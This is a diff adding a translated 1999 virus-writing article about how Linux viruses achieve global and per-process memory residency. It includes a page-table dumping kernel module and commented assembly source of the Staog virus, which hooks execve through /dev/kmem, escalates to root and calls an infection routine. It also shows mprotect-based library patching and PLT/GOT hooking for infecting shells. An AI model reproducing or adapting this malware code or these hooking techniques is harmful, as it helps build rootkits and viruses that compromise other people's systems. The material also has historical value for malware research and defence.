+        (gdb)x/2 0x80495ED
+        0x80495ed <data_>: 0x501007FF       0x0807C180         
+      
+        Dump after SGDT  
+
+        (gdb)x/2 0x80495ED
+        0x80495ed <data_>: 0x6880203F       0x0807C010  
+
+        Dump after SLDT
+
+        (gdb)x/2 0x80495ED
+        0x80495ed <data_>: 0x688002Af       0x0807C010
+
+
+ The first and the second assembler opcodes return in the first 16 bits of
+ 'data_' the IDT and the GDT limits respectively, and in the next 32 bits
+ the lineal address of that structures. Meanwhile, the SLDT only returns a
+ selector that points to its descriptor inside the GDT (each LDT must have
+ defined a descriptor in the GDT).
+
+ So we know that the IDT has as base address 0xC1805010 and its limit is
+ 0x7FF bytes. The GDT will have as base address 0xC0106880 and will have a
+ size of 0x203F bytes. And of the LDT we know that its descriptor is 0x2AF.
+ As we were expecting, the addresses are all above 0xC0000000, so they are
+ well protected from the user-processes.
+
+ Another way for access the kernel memory could be to map kernel pages below
+ 0xC0000000, but painfully, that is not possible because the page table is
+ mapped above the 0xC0000000 address, so it can't be modified by Ring-3 pro-
+ cesses. Linux maps all the physical memory of your machine parting from the
+ linear address 0xC0000000, or, with another words, the virtual address 0x0
+ using the kernel segment 0x10. We can build a module for read the CR3 reg,
+ that contains the physical address of the page table, and with that info,
+ visualize the mapped pages. The program would be the following one:
+
+/****************************************************************************
+                      Lector de la Tabla de Paginas        
+ ***************************************************************************/
+
+/*
+
+        Format of an entry
+        
+       31-12         11-9   7    6    5     2      1    0
+       address        OS    4M   D    A    U/S    R/W   P
+       
+       If p=1 the page is in memory 
+       If R/W=0 means that it's readonly
+       If U/S=1 means that the page is an user page    
+       If A=1 means that the page have been accessed
+       If D=1 page dirty
+       If 4M=1 it's a 4M page (only for the tdd entry)
+       OS is specific of the operative system
+
+*/
+
+
+#include <linux/module.h> 
+#include <linux/kernel.h>
+#include <linux/errno.h>
+#include <linux/mm.h>
+#include <asm/system.h>
+#include <linux/sched.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <asm/page.h>
+#include <asm/pgtable.h>
+#ifdef MODULE
+
+extern void *sys_call_table[];
+unsigned long *tpaginas;
+unsigned long r_cr0;
+unsigned long r_cr4;       /* read some interesting registers */
+
+int init_module(void)
+{  
+  unsigned long *temp;
+  int x,y,z;
+  
+                          /* Read the physical address of the page table that
+                          is matches with the virtual address */
+                          /* And btw, i read some interesting processor regs
+                          like cr0 and cr4 */
+                          /* As we can see, in CR4 is activated the option of
+                          4M pages */
+                          /* And in CR0 the WP bit active :) */                          
+  __asm("
+    movl %cr3,%eax
+    movl %eax,(tpaginas) 
+    movl %cr0,%eax
+    movl %eax,(r_cr0)
+    movl %cr4,%eax
+    movl %eax,(r_cr4)
+   ");
+ 
+  x=tpaginas+0xc0000000;
+  printk(" The physical and virtual address \n");
+  printk(" of the page table is : %x\n",tpaginas);
+  printk(" Control Register Cr0: %x\n",r_cr0);
+  printk(" Control Register Cr4: %x\n",r_cr4); 
+  for (z=0;z<90000000;z++){} 
+  for(x=0x0;x<0x3ff;x++)
+  {
+if (((unsigned long) *tpaginas & 0x01) == 1) 
+ {
+ printk("Entry %x  -> %x ",x,(unsigned long) *tpaginas & 0xfffff000);   
+ printk("      u/s:%d      r/w:%d\n",(((unsigned long) *tpaginas & 0x04)>>2),(((unsigned long) *tpaginas & 0x02)>>1));   printk("      OS:%x  ",((unsigned long) *tpaginas &0xffff ) >>9 );
+ printk("   p:%d\n",((unsigned long) *tpaginas & 0x01));
+
+ if ((((unsigned long) *tpaginas & 0x80)>>7)==1) 
+            {
+             printk("In the virtual address ->  %x",x<<22);
+             printk(" there is a 4M page \n");
+             for (z=0;z<90000000;z++){};
+             tpaginas++;
+             continue;
+             };
+ for (z=0;z<4000000;z++){};
+
+  temp=((unsigned long) *tpaginas & 0xfffff000); /* in temp i read the page
+                                                    table address */
+  if (temp!=0 && ((unsigned long) *tpaginas & 0x1))
+           {
+           for (y=0;y<0x3ff;y++)
+               {   
+                   
+  if  (((unsigned long) *temp & 0x01) == 1) 
+  {
+  printk("Virtual  %x -> %x ",(x<<22|y<<12),((unsigned long) *temp & 0xfffff000));   
+  printk("      u/s:%d      r/w:%d",(((unsigned long) *temp & 0x04)>>2),(((unsigned long) *temp & 0x02)>>1)); 
+  printk("      OS:%x  ",((unsigned long) *temp &0xffff ) >>9 );
+  printk("   p:%d\n",((unsigned long) *temp & 0x01));
+  };
+  if (*temp!=0) {for (z=0;z<4000000;z++){}};    /* slow-down */
+  
+  temp++;
+      };
+      
+    };
+  };
+  tpaginas++;
+  
+  };
+
+}
+
+void cleanup_module(void)
+{
+}
+
+#endif
+
+/***************************************************************************/
+
+ After the execution of this program we can get the mapped pages in that mo-
+ ment, and the protection attributes of each page.
+
+ The first page we would see would be the read-only pages of the process
+ being executed in Ring-3 on the address 8040000 with read only attributes
+ and the user bit, the next ones would be the read/write pages of the execu-
+ table, with user attributes too. After, in the 40000000 address we would
+ have the library libc mapped in memory in a similar way: first r/w code, and
+ after, some read only pages. When we arrive to the linear address 0xC0000000
+ we enter the marvelous world of the core, where is mapped all the physical
+ memory of your PC. If it's Pentium or higher, it will use 4M pages. So, if
+ you have 16 megs of RAM, from the 0xC0000000 address, Linux would use 4
+ entries in the directory table for map those 16 megs, if it would have 32
+ it would use 8, etc.
+
+ This system guides us to make ourselves some questions, like, for example,
+ what would happen if we got 1G of physical memory? In these pages lies the
+ code of the core, aswell as the page table, and surprisingly it lacks of
+ protection via pagination, uses r/w attributes and the user bit for mark
+ the page, so the bad-coded modules that try to overwrite the code of the
+ core would achieve such goal without making any protection fault :)
+
+ But that's not all, after map all the physical memory of the machine. It
+ maps some 4Kb pages, all with system attributes, all except one, used for
+ store the IDT (interrupt table) that is the only one with read-only
+ attributes and the S bit, so any bad-coded module that could try to over-
+ write it, wouldn't achieve that, and would die by a protection fault, and
+ the system would remain stable.
+
+ The fact that any Ring-0 process is not able to modify a read-only page is
+ handled by the WP bit of the control register CR4. If that bit is set to 1,
+ then all the Ring-0 processes won't be able to write in read only pages,
+ neither user, neither kernel. If that bit is set to 0, the memory protection
+ works like a 386 and a Ring-0 process can do whatever it wants to, being
+ able to modify all mapped pages, no matter of their protection attributes.
+ So, if a Linux module wants to modify the IDT, will firstly have to deact-
+ ivate the WP bit of the CR4 reg for be able to write, or modify the page
+ attributes of that page in the page table.
+
+ Because all the said, the real mechanism of protection in Linux is the
+ segmentation, and not the pagination as it occurs in Windows NT. If we would
+ have 4G segments, as in NT, and the pagination would be as ids, we would
+ have free access to kernel memory, but this is not the case.
+
+ NOTE: Actual versions as 2.2.XX of the core use a protection similar to NT
+       with 4G segments, painfully i haven't been able to look at the page
+       table of that version,but it's a fool thing to think it remains stable
+
+ Another possibility of achieve Ring-0 in Linux consist is the call to the
+ system call modify_ldt for generate a CALL GATE. That system call was crea-
+ ted for make WINE to be able to emulate windows' memory system, where the
+ user segment descriptors lies at the LDT and not in the GDT, and where it's
+ possible to directionate all the memory with those segments. Generate a CALL
+ GATE with modify_ldt could be possible if we were able to write to every
+ fields of each generated entry, but that's not possible. Firstly, modify_ldt
+ doesn't accepts as an entry an INTEL segment descriptor, it uses this pseudo
+ structure that will be later translated to a descriptor with INTEL format
+ inside the call:
+
+ struct modify_ldt_ldt_s {
+     unsigned int  entry_number;      /* The entry we wanna modify         */
+     unsigned long base_addr;         /* The base address of the segment   */
+     unsigned int  limit;             /* The limit of the segment          */
+     unsigned int  seg_32bit:1;       /* If its of 16 or 32 bits           */
+     unsigned int  contents:2;        /* If its of data, code or stack     */
+     unsigned int  read_exec_only:1;  /* Protection attributes             */
+     unsigned int  limit_in_pages:1;  
+     unsigned int  seg_not_present:1; /* If it's in memory or not          */  
+     unsigned int  useable:1;         
+     };
+
+ If we see the code of the call in /usr/src/linux/arch/i386/kernel/ldt.c ,
+ this code shouws us the transformation of that structure to an INTEL des-
+ criptor:
+
+        *lp     = ((ldt_info.base_addr & 0x0000ffff) << 16) |
+		  (ldt_info.limit & 0x0ffff);
+	*(lp+1) = (ldt_info.base_addr & 0xff000000) |
+		  ((ldt_info.base_addr & 0x00ff0000)>>16) |
+		  (ldt_info.limit & 0xf0000) |
+		  (ldt_info.contents << 10) |
+		  ((ldt_info.read_exec_only ^ 1) << 9) |
+		  (ldt_info.seg_32bit << 22) |
+		  (ldt_info.limit_in_pages << 23) |
+		  ((ldt_info.seg_not_present ^1) << 15) |
+		  0x7000;  
+     
+ ldt_info is the structure we have passed as a parameter,and *lp is a pointer
+ inside the LDT where resides the segment entry we want to modify. Seeing the
+ structure of an INTEL entry we can see the transformation:
+
+    63-54  55  54  53  52   51-48   47  46-45   44  43-40   39-16 15-0
+    
+    base   G   D   R   U    limit   P   DPL      S   type   base  limit
+    31-24                   19-16                           23-0  15-0
+
+ With the *lp we fill the 32 first bits of the entry, corresponding to the
+ 16 first bits of the limit and the 16 first bits of the base address, and
+ with *(lp+1) we fill the rest of the information. But after make all the
+ operations with ldt_info, there is an OR operation with the 0x7000 constant.
+ Passing this constant to binary we got 0111000000000000, so we know that
+ always the generated descriptors will have the bits 44, 45 and 46 actives.
+ Those bits correspond with the DPL and the S bit. So we could only create
+ user segments. That doesn't matter, because the segment must be of user for
+ allow its execution by an user, But the next bit, the S bit, has a lot of
+ importance. The bit S is 1 when is a normal segment, and is 0 when a segment
+ is of system like the TSS or the CALL GATES, so the generation of CALL GATES
+ is impossible with the modify_ldt function. Modify_ldt also limits the
+ creation of segments of limit over 0xC0000000, thing that would allow to
+ directionate kernel's space. Modify_ldt checks the limit of the segment we
+ want to create with the limits_OK function, and returns a boolean value
+ as it can ve seen in this instruction. Last would be the last accessible
+ byte by the segment, and first the first one, and the constant TASK_SIZE
+ takes the value 0xC0000000.
+
+ 	return (last >= first && last < TASK_SIZE);
+
+ If we can't write in the IDT, the GDT, the LDT, or the page table for jump
+ to Ring-0, and the call modify_ldt is limited for the generation of CALL
+ GATES, another possibility is to use virtual files for access kernel memory.
+ This has a very important problem, and it's that files as /dev/mem and
+ /dev/kmem are only accessed, by default, by the root. However, it's one of
+ the choices more interesting for the creation of global residents under
+ Linux. Staog is one of the few viruses for Linux that uses this method, also
+ it doesn't wait the root to execute it, as it uses 3 different exploits for
+ access /dev/kmem, but the exploit usages limits it's functionality to few
+ kernel versions.  The /dev/kmem allows the access of kernel memory, the
+ first byte of that segment is the same of the first byte of kernel's segment
+ or, what it's the same, the linear address 0xC0000000.
+
+.text                                     # This is the code that hooks the
+                                          # sys_call to execve
+.string "Staog by Quantum / VLAD"      
+                                         
+.global main
+main:
+	movl %esp,%ebp
+        movl $11,%eax                     # Firstly, checks if it's already 
+        movl $0x666,%ebx                  # resident, calling to execve with
+        int $0x80                         # the value 0x666 in EBX, and if it
+        cmp $0x667,%ebx                   # is in mem, the virii in mem will 
+        jnz goresident1                   # return the value 0x667
+	jmp tmpend
+goresident1:
+        movl $125,%eax
+        movl $0x8000000,%ebx
+        movl $0x4000,%ecx
+        movl $7,%edx
+        int $0x80
+
+ This code is very important, because we call to mprotect for unprotect the
+ memory pages used by the virus. This is done for avoid the modification of
+ the ELF file, and put the data of the virus in a data section and the code
+ in one of code. In this way, we can put all the data of the virus in the
+ same page, and it doesn't matter if the virus is in a code section, at the
+ execution time, it unprotects it.
+
+ NOTE: It is only possible to execute mprotect inside the PerProcess memory.
+
+ The first it's going to try is to reserve some kernel memory for copy the
+ virus code there, and after will modify the sys_call_table entry that
+ corresponds to the execve for put instead it a pointer to the hooker routine
+ of such function. For reserve memory inside the kernel, it's only possible
+ with kernel internal calls like kmalloc. For be able to execute it, the
+ virus overwrites the system call uname using /dev/kmem, and makes a call to
+ uname with the int 0x80 when it before returning from the interrupt, and it
+ would have already executed the code we used to reserve memory with kmalloc.
+ But before all that, it needs to know uname address. For that, the virus
+ uses the system call get_kernel_syms, with it, it can obtain a list with all
+ the internal Linux functions, and also pointers to structures as the said
+ sys_call_table, that is an array in memory with pointers to the accesible
+ functions with int 0x80, like uname function.
+
+        movl $130,%eax                    # Obtain the number of symbols
+        movl $0,%ebx                      # passing in EBX the value 0
+        int $0x80                         # Returns in EAX:Number of symbols
+	
+        shll $6,%eax          # Make a 6 bit shifting to the left. This is 
+                              # the same as multiply the symbol number by 64
+                              # that are the bytes occupied by each entry
+                              # returned by get_kernel_syms
+                              # The information obtained is the same that the
+                              # located at /proc/ksyms.
+                              # 4 bytes with a kernel address and 60 bytes
+                              # with symbol's name
+
+        subl %eax,%esp        # Reserve space in the stack
+        movl %esp,%esi        # before the call    
+                              # the ESI register will point to a mem structure
+	pushl %eax
+        movl %esi,%ebx        # obtain kernel symbols
+	movl $130,%eax
+	int $0x80
+	pushl %esi      
+nextsym1:                     # Here i scan the symbol table in memory
+        movl $thissym1,%edi   # seaching the string current (zero-terminated)
+	push %esi
+	addl $4,%esi
+	cmpb $95,(%esi)
+	jnz notuscore
+	incl %esi
+notuscore:
+	cmpsl
+	cmpsl
+	pop %esi
+	jz foundsym1
+        addl $64,%esi         # Look how it increments 64 by 64 for make the
+        jmp nextsym1          # comparisons
+foundsym1:
+	movl (%esi),%esi
+        movl %esi,current           # Store search result in the variable
+        popl %esi                   # current
+
+	pushl %esi      
+nextsym2:                           # Look also the kmalloc symbol with the
+        movl $thissym2,%edi         # same way.
+	push %esi
+	addl $4,%esi
+	cmpsl
+	cmpsl
+	pop %esi
+	jz foundsym2
+	addl $64,%esi
+	jmp nextsym2
+foundsym2:
+	movl (%esi),%esi
+        movl %esi,kmalloc          # Store search result in the kmalloc var
+        popl %esi
+
+	xorl %ecx,%ecx
+nextsym:                           # find symbol
+        movl $thissym,%edi         # And now sys_call_table address
+	movb $15,%cl               
+	push %esi
+	addl $4,%esi
+	rep 
+	cmpsb
+	pop %esi
+	jz foundsym
+	addl $64,%esi
+	jmp nextsym
+foundsym:
+	movl (%esi),%esi
+	pop %eax
+	addl %eax,%esp
+
+        movl %esi,syscalltable    # Store in the syscalltable variable the
+        xorl %edi,%edi            # address found.
+	
+
+ At this point the virus knows the memory position of the sys_call_table   
+
+
+opendevkmem:
+        movl $devkmem,%ebx           # Open the /dev/kmem file
+        movl $2,%ecx                 # EBX = Ptr to string with the name
+        call openfile                # ECX = Open way ($2 read/write)
+	orl %eax,%eax
+        js haxorroot                 # If it couldn't be opened, jumps to a
+        movl %eax,%ebx               # routine for access /dev/kmem by means
+                                     # of exploits
+  
+ # Realize that ESI still have the address of the sys_call_table, and if to
+ # that we add 44, we will obtain a pointer to the address where is the ptr
+ # to execve inside the sys_call_table
+
+        leal 44(%esi),%ecx           # lseek to sys_call_table[SYS_execve]
+	call seekfilestart
+	
+        movl $orgexecve,%ecx         # Read pointer's value
+	movl $4,%edx                 # 4 bytes
+	call readfile
+
+        leal 488(%esi),%ecx          # Now move the coresponding entry to 
+        call seekfilestart           # uname inside the sys_call_table
+
+        movl $taskptr,%ecx           # And read the sys_call_table[SYS_uname]
+        movl $4,%edx                 # value, and store it in the var taskptr
+	call readfile
+	
+        movl taskptr,%ecx            # Move ourselves to the code where is the
+        call seekfilestart           # uname function in memory.
+
+	subl $endhookspace-hookspace,%esp
+                                     # Reserve space in the stack for the code
+                                     # that i'm going to overwrite
+        movl %esp,%ecx               # Read the code i'm going to overwrite
+        movl $endhookspace-hookspace,%edx # of uname on the stack
+	call readfile
+	
+        movl taskptr,%ecx           # Return to the beginning of uname routine
+	call seekfilestart
+
+	movl filesize,%eax               
+	addl $virend-vircode,%eax
+	movl %eax,virendvircodefilesize
+
+ # Now write the routine for reserve memory over uname's code
+
+	movl $hookspace,%ecx    
+	movl $endhookspace-hookspace,%edx
+	call writefile
+
+        movl $122,%eax             # Make a call to uname, but what's really
+        int $0x80                  # going to be executed will be our routine
+        movl %eax,codeto           # EAX = address we've reserved
+	
+        movl taskptr,%ecx          # Go back to uname's code
+	call seekfilestart
+
+        movl %esp,%ecx                    # And restore the uname's original
+        movl $endhookspace-hookspace,%edx # that we had temporally in stack 
+        call writefile                    # to its original place.
+	
+        addl $endhookspace-hookspace,%esp # Remove the memory we had reserved
+                                          # in the stack
+	subl $aftreturn-vircode,orgexecve       
+
+        movl codeto,%ecx                  # Move now the pointer to the begin 
+        subl %ecx,orgexecve               # of the mem zone we had reserved
+	call seekfilestart
+
+        movl $vircode,%ecx                # And write the virus code in it
+	movl $virend-vircode,%edx
+	call writefile
+
+        leal 44(%esi),%ecx                # Search the sys_call_table, relative
+        call seekfilestart                # to execve, and i modify the orig.
+                                          # pointer by our function
+	addl $newexecve-vircode,codeto
+
+        movl $codeto,%ecx                 # Write the new ptr in sys_call_table
+	movl $4,%edx
+	call writefile
+
+        call closefile                    # close /dev/kmem
+
+tmpend:
+
+	call exit
+
+openfile:                       # System calls made with int 0x80
+        movl $5,%eax            # EAX = Function to do
+        int $0x80               # see /usr/include/sys/syscall.h for a function
+        ret                     # list
+
+closefile:
+	movl $6,%eax
+	int $0x80
+	ret
+
+readfile:
+	movl $3,%eax
+	int $0x80
+	ret
+
+writefile:
+	movl $4,%eax
+	int $0x80
+	ret
+
+seekfilestart:
+	movl $19,%eax
+	xorl %edx,%edx
+	int $0x80
+	ret
+
+rmfile:
+	movl $10,%eax
+	int $0x80
+	ret
+
+
+exit:
+	xorl %eax,%eax
+	incl %eax
+	int $0x80
+
+
+thissym:                            # Here are defined some variables
+.string "sys_call_table"            # See that they're in the same section of
+                                    # the code. That's why we use mprotect.
+thissym1:
+.string "current"
+
+thissym2:
+.string "kmalloc"
+
+devkmem:
+.string "/dev/kmem"
+
+e_entry:
+.long 0x666
+
+infect:                                   # Infection routine
+       
+
+
+       # Here should go the ELF infection routine. It consist in generate a
+       # temporal file with the virus code and execute it with execve
+
+       ret
+
+.global newexecve
+newexecve:
+	pushl %ebp
+        movl %esp,%ebp                      # In the stack will be all regs,
+        pushl %ebx                          # see that we're inside an int 0x80
+        movl 8(%ebp),%ebx
+	pushal
+        cmpl $0x666,%ebx                    # If EBX = 0x666, we return 
+        jnz notserv                         # 0x667 because it's the residency
+        popal                               # mark.
+	incl 8(%ebp)                        
+	popl %ebx
+	popl %ebp
+	ret
+notserv:
+        call ring0recalc                    # Calculate the displacement of
+ring0recalc:                                # addresses in memory
+	popl %edi
+	subl $ring0recalc,%edi
+        movl syscalltable(%edi),%ebp        # EBP = Address of sys_call_table
+	call saveuids                      
+	call makeroot          
+        call infect                         # Infect the file
+	call loaduids                       
+hookoff:
+	popal
+	popl %ebx
+	popl %ebp
+.byte   0xe9                                # Go to the original execve func.
+orgexecve:                                  # 0xE9 is the jump opocode and the
+.long   0                                   # next 4 bytes are the  4 bytes
+aftreturn:                                  # if the orgexecve variable. The
+                                            # equivalent would be jmp orgexecve
+syscalltable:                              
+.long 0
+
+current:
+.long 0
+
+.global hookspace            # This is the routine that reserves memory.
+hookspace:                   # Its the one that is overwritten by the virus
+        push %ebp            # over uname.
+	pushl %ebx
+	pushl %ecx
+	pushl %edx
+	movl %esp,%ebp
+
+	pushl $3
+.byte   0x68
+virendvircodefilesize:
+.long   0
+.byte   0xb8               # movl $xxx,%eax ;0xb8 is the opcode of a movl and
+kmalloc:                   # the next bytes correpond with the kmalloc var,
+.long   0                  # so, when we find kmalloc in mem, a 
+        call %eax          # movl $kmalloc,%eax will be generated
+                           # and with call %eax we jump to kmalloc for reserve
+                           # memory                 
+	movl %ebp,%esp
+	popl %edx
+	popl %ecx
+	popl %ebx
+	popl %ebp       
+	ret     
+
+.global endhookspace
+endhookspace:
+.global virend
+virend:
+
+
+
+ 2. Global residency in Ring-3
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ The base of this method of residency consists in the hook of routines in
+ Ring-3 and that are executed by all the processes.
+
+ The code of Ring-3 that can be executed by all the processes are the libra-
+ ries, in windows are the DLLs.
+
+ Windows, for example, distributes its space in 4 arenas, each arena has a
+ different utility and has differend code and data. There is one arena dedi-
+ cated to DOS that goes from the virtual address 0 to 40000000, another one
+ dedicated to the PerProcess memory, that goes from 40000000 to 80000000,
+ another that handles the shared memory by all the processes that goes from
+ 80000000 to C0000000, and another dedicated to VXD, i.e. kernel's code, that
+ is executed in Ring-0 and goes from C0000000 to FFFFFFFF.
+
+ The most important library in windows is the KERNEL32.DLL, and there are the
+ functions of file creation, memory handling, etc. (in linux the equivalent
+ could be the library libc).
+
+ The files, instead of execute directly TRAP GATES for make the calls to
+ Ring-0 code, use a dynamic link mechanism for jump to library's code (Ring-3
+ code) that do the jump to Ring-0 for obtain the desired kernel service.
+ Windows 95 commited a great dessign fail, and it is the fact that it loads
+ the majority of libraries in the shared memory arena (KERNEL32 library is
+ load at BFF70000 address). To locate the most important libraries into a
+ shared memory arena has the advantage that the system doesn't have to load
+ the library with each file that imports calls to that library, because it's
+ in the process memory. This fact also makes possible the hook of system
+ calls without the need of jump to Ring-0. Viruses like Win95.HPS and
+ Win95.K32 use this fact for achieve global residence without jumping to
+ Ring-0. However this is not as easy as it gets, because even if the kernel
+ doesn't have protection by pagination, the files have protection by pagina-
+ tion in the code sections (for handle the try of write into the code secti-
+ ons). However, this could be unprotected easily using VXD calls like
+ _pagemodifypermissions or library calls like memoryprotect.
+
+ In Linux we could try to hook functions like execve of the libc library,
+ located from the virtual address 0x40000000. Any try of a program of write
+ to protected pages will mean protection faults, because there is pagination
+ prtoection in the code sections, as in the code sections of the normal exe-
+ cutables. But the function mprotect also works with library's code, because
+ these are located below 0xC0000000, in the PerProcess memory. Code as the
+ one that follows allows you to unprotect pages of libraries like libc. As we
+ saw in the introduction, the address of the getpid function of libc its
+ loaded in the address 0x40073000 in my Linux version, so we know that it's
+ a code section, so it would be protected againist write attempts.
+
+        [section .text]
+        [extern puts]
+        [global main]
+
+main:   pushad
+	
+        mov     eax,0125h
+        mov     ebx,40073000h
+        mov     ecx,02000h
+        mov     edx,07h
+        int     80h                     ; Call to mprotect 
+     
+        mov     ebp,40073000h
+        xor     eax,eax                 ; Put EAX to 0
+        mov     dword [ebp],eax         ; Write EAX value in EBP address
+        popad                           ; 0x40073000
+	         
+        ret
+
+ Note that this program without using mprotect would generate a general
+ protection fault. Now try to execute simultaneously 2 copies of the program.
+ The first page would unprotect a libc page and modify the first bytes of the
+ call to getpid putting them to 0; the second copy is stopped by gdb in the
+ main position for test what value is in the 0x40073000 address. The value
+ won't be 0, it would be the original value.
+
+ This is because Linux doesn't load its libraries in shared arenas, it loads
+ them in the PerProcess memory. But if the PerProcess memory is different for
+ each process, do the libraries get loaded with each executable, occupying
+ unnecessary memory? The answer is NO, the solution is in the copy-on-write
+ mechanism that allows the sharing of read/write memory pages between
+ different processes, when these pages are in the memory of the process. When
+ the program is load in memory, in the 0x40073000 address will be the memory
+ page of the parent program, and if we try to write in it, the system will
+ verify if it's a read/write or read only page. If it's read-only, the system
+ will generate a page fault, and if it's read/write, the OS will generate a
+ copy of that page for the child process, so when the program writes on it,
+ it's really writing to an own page, not to the parent page. This method
+ allows the share of libraries in memory, preserving the security, avoiding
+ undesired attempts of global residency. Linux implements shared memory, but
+ it's only for inteprocess communication mechanisms (IPC).
+
+
+
+ 3. PerProcess residency
+ ~~~~~~~~~~~~~~~~~~~~~~~
+ As i explained in the chapter of ELF infection, the ELF format is a very
+ potent format, and between its important funcitonalities resides the dynamic
+ link of functions.
+
+ The Linux executables don't usually use the int 0x80, they leave that job to
+ libraries like libc. With the usage of libraries we earn disk space, because
+ that code is not inserted inside the executable each time. But these libra-
+ ries can be loaded in any address of the PerProcess memory. This makes
+ necessary the existence of one mechanism that allow the call to functions in
+ files or different libraries, this mechanism is the dynamic link.
+
+ There are 2 main sections that are there for make the dynamic link of
+ functions. The section .plt (Procedure Linkage Table) and the section .got
+ (Global Offset Table).
+
+ Linux's dinamic link system had advantages among all the other systems. The
+ PE format of Windows, for example, has specific sections for the linkage
+ such as the Import Table, in it there are as many entryes as functions
+ imported from libraries, and that references are resolved at load-time. In
+ Linux, however, doesn't resolve them in load-time, it waits for the first
+ execution of a system call for resolve the reference of that function. With
+ the first execution, the program gives the control to the dynamic linker,
+ that is a function inside the library we want to call, then the linker
+ resolves the refernce and puts the absolute address of the system call in
+ a table in memory called .got, so the next functions will jump directly to
+ the function without needing to call previously to the dynamic linker. With
+ that,we make better the system productivity avoiding to have to resolve that
+ memory reference that maybe the executable won't execute. If we disassemble
+ the next executable...
+
+          #include <unistd.h>
+          void main()
+          {
+          getpid();        /* 1st call to getpid */
+          getpid();        /* 2nd call to getpid */
+          }
+                   
+ We obtain the following assembler code
+      
+      0x8048480 <main>:    pushl %ebp
+      0x8048481 <main+1>:  movl  %esp,%ebp
+      0x8048483 <main+3>:  call  0x8048378 <getpid>
+      0x8048488 <main+8>:  call  0x8048378 <getpid>
+      0x804848d <main+13>: movl  %ebp,%esp
+      0x804848f <main+15>: pop   %ebp
+      0x8048490 <main+16>: ret
+
+ The calls to GETPID will be built as a jump to an entry in then .plt secti-
+ on, as we can see with the command "info file", the section .plt is mapped
+ between 0x08048368 and 0x080483C8. If we continue tracing inside the .plt
+ code we will see the following code:
+      
+      0x8048378 <getpid>:    jmp *0x80494e8
+      0x804837e <getpid+6>:  push $0x0
+      0x8048383 <getpid+11>: jmp 0x8048368 <_init+8>
+      
+ This will be the basic structure of a .plt entry. The first jmp will be a
+ jump to the address contained in the address 0x80494E8. This address is part
+ of the .got table, and in the load-time will have the value 0x804837E.
+       
+      (gdb)x 0x80494e8
+      0x80494e8 <__DTOR_END__+16>:  0x0804837e
+
+ As it's the first time we call to GETPID in the executavle, this will have
+ to make a jump to the dynamic linker for obtain the address of the function
+ in the library. For that it makes a push 0x0, where 0x0 is the pointer
+ inside the reloc area that specifies to the dynamic linker what's the .got
+ entry it has to modify. After, it makes a jmp 0x8048368, where 0x8048368 is
+ the address of the first entry of the .plt section. The first entry of the
+ .plt is special, because it's only used for call to the dynamic linker. If
+ we contine debugging, we'll see the structure of the first .plt entry.
+      
+      0x8048368 <_init+8>:  pushl 0x80494e0
+      0x804836e <_init+14>: jmp   *0x80494e4
+
+ Firstly, it puts on stack the value 0x80494E0, that corresponds with the 2nd
+ entry in the .got table, and after it makes a jump to the address contained
+ in 0x80494E4 (the third entry of the .got). The 3 first entries of the .got
+ doesn't contain pointers to the .plt at load-time, they are special entries.
+ The first one contains a pointer to the .dynamic section, and the third one
+ is filled with a pointer to the position of the dynamic linker. 
+     
+      (gdb)x 0x80494e4
+       0x80494e4<__DTOR_END__+12>: 0x40004180
+
+ So if we continue tracing, we'll see the code of the dynamic linker, already
+ in the memory space of the library. When the program returns from the system
+ call, in the .got section corresponding to GETPID, the linker will have put
+ the absolute address of the function. If we continue tracing, in the second
+ call to GETPID, we could see the new value in the .got section. 
+     
+      (gdb)x 0x80494e8
+      0x80494e8 <__DTOR_END__+16>:  0x40073000
+
+ so,with the instruction jmp *0x80494E0 we will jump directly to the function
+ without calling to the dynamic linker.
+
+ This mechanism allows the hook of system calls inside the memory of the own
+ process, it's the denominated PerProcess residency. A virus with this mecha-
+ nism can hook, for example, the execve call, modifying the .plt entry that
+ corresponds with that call, exchanging the jmp *address_in_got by a
+ jmp *virus_address. However, the virus, being executed in Ring-3, will have
+ the eternal limitations in the file access, and will be only able to infect
+ the files the user can have access to. Another limitation is that it only
+ hooks system call in contaminated files. Clean files being executed
+ won't have their calls hooked by the virus.
+
+ However, the possibilities of this method are really impressive, if a
+ command interpret like bask or sh is infected, then, because they are
+ commands executed by all users, the hook of execve in a PerProcess way could
+ be as effective as a global residency.
+
+ (c) 1999 Mr Anonymous [ Original Article ]
+ (c) 1999 Billy Belcebu/iKX [ Translation ]
